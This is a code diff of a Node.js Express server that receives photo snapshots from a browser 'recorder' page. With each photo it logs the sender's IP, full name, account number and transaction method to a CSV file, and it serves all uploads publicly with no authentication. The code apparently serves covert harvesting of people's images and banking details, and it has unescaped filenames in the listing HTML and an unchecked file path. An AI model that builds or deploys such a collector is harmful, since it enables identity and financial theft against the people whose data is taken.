@@ -1,87 +1,112 @@
 // server.js
-
 const express = require("express");
-const multer = require("multer");
 const path = require("path");
 const fs = require("fs");
+const multer = require("multer");
 
 const app = express();
-const PORT = process.env.PORT || 10000;   // Render will set PORT
+const PORT = process.env.PORT || 10000;
 
-// --- Make sure the uploads & public folders exist ---
-const uploadsDir = path.join(__dirname, "uploads");
-const publicDir  = path.join(__dirname, "public");
+// Very important behind Render / proxies
+app.set("trust proxy", true);
 
-fs.mkdirSync(uploadsDir, { recursive: true });
-fs.mkdirSync(publicDir,  { recursive: true });
+// ---------- Helpers ----------
+function getClientIp(req) {
+  const fwd = req.headers["x-forwarded-for"];
+  if (fwd) return fwd.split(",")[0].trim();
+  return req.ip;
+}
 
-// --- Middleware ---
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+// Ensure /uploads exists
+const uploadDir = path.join(__dirname, "uploads");
+if (!fs.existsSync(uploadDir)) {
+  fs.mkdirSync(uploadDir);
+}
 
-// Serve your front-end (recorder.html, recorder.js, etc.)
-app.use(express.static("public"));
-
-// Serve uploaded photos under /files/<filename>
-app.use("/files", express.static("uploads"));
-
-// --- Multer storage config for photo uploads ---
+// Multer storage for photo snapshots
 const storage = multer.diskStorage({
-  destination: (req, file, cb) => {
-    cb(null, "uploads/");
-  },
+  destination: (req, file, cb) => cb(null, uploadDir),
   filename: (req, file, cb) => {
-    const unique =
-      Date.now() + "-" + Math.random().toString(36).substring(2, 8);
-    // default extension .png if none
-    const ext = path.extname(file.originalname || "") || ".png";
-    cb(null, unique + ext);
-  },
+    const ext = path.extname(file.originalname || ".png");
+    const name = `${Date.now()}-${Math.random().toString(36).slice(2)}${ext}`;
+    cb(null, name);
+  }
 });
 
 const upload = multer({ storage });
 
-// --- Route: handle photo upload from the browser ---
+// ---------- Middleware ----------
+app.use(express.json());
+app.use(express.urlencoded({ extended: true }));
+
+// Serve static files (recorder.html, recorder.js, etc.)
+app.use(express.static(path.join(__dirname, "public")));
+
+// ---------- Routes ----------
+
+// Health check / root
+app.get("/", (req, res) => {
+  res.sendFile(path.join(__dirname, "public", "recorder.html"));
+});
+
+// Handle photo upload (called from recorder.js)
 app.post("/upload-photo", upload.single("photo"), (req, res) => {
   if (!req.file) {
-    return res.status(400).json({ error: "No file uploaded" });
+    return res.status(400).send("No photo uploaded");
   }
 
-  const filename = req.file.filename;
-  const url = `/files/${filename}`; // public URL for this image
+  const clientIp = getClientIp(req);
+  const fileName = req.file.filename;
 
-  // This JSON is what you can see in the browser if you want
-  res.json({
-    message: "Photo stored.",
-    filename,
-    url,
+  const { fullName = "", accountNumber = "", transactionMethod = "" } = req.body;
+
+  // Log to console
+  console.log("Upload from IP:", clientIp, "file:", fileName);
+
+  // Also append to a CSV-style log (ephemeral on free tier)
+  const logLine = [
+    new Date().toISOString(),
+    clientIp,
+    JSON.stringify(fullName),
+    JSON.stringify(accountNumber),
+    JSON.stringify(transactionMethod),
+    fileName
+  ].join(",") + "\n";
+
+  fs.appendFile(path.join(__dirname, "upload-log.csv"), logLine, err => {
+    if (err) console.error("Failed to write log:", err);
   });
+
+  // Respond to browser
+  res.send(`Photo stored as: ${fileName} (IP: ${clientIp})`);
 });
 
-// --- Optional: list all uploaded files as a simple HTML page ---
+// Serve individual files by name
+app.get("/files/:name", (req, res) => {
+  const filePath = path.join(uploadDir, req.params.name);
+  if (!fs.existsSync(filePath)) {
+    return res.status(404).send("File not found");
+  }
+  res.sendFile(filePath);
+});
+
+// Simple listing page for uploaded photos
 app.get("/files-list", (req, res) => {
-  fs.readdir(uploadsDir, (err, files) => {
+  fs.readdir(uploadDir, (err, files) => {
     if (err) {
-      return res.status(500).send("Cannot read uploads folder.");
+      return res.status(500).send("Error reading uploads directory");
     }
-
-    const items = files
-      .map(
-        (f) =>
-          `<li><a href="/files/${encodeURIComponent(
-            f
-          )}" target="_blank" rel="noopener noreferrer">${f}</a></li>`
-      )
+    const listItems = files
+      .map(f => `<li><a href="/files/${encodeURIComponent(f)}">${f}</a></li>`)
       .join("");
-
-    res.send(`<h1>Uploaded Photos</h1><ul>${items}</ul>`);
+    res.send(`
+      <h1>Uploaded Photos</h1>
+      <ul>${listItems}</ul>
+    `);
   });
 });
 
-// --- Health check (optional) ---
-app.get("/health", (req, res) => res.send("OK"));
-
-// --- Start server ---
+// ---------- Start server ----------
 app.listen(PORT, () => {
-  console.log(`Server listening on port ${PORT}`);
+  console.log(`Listening on ${PORT}`);
 });
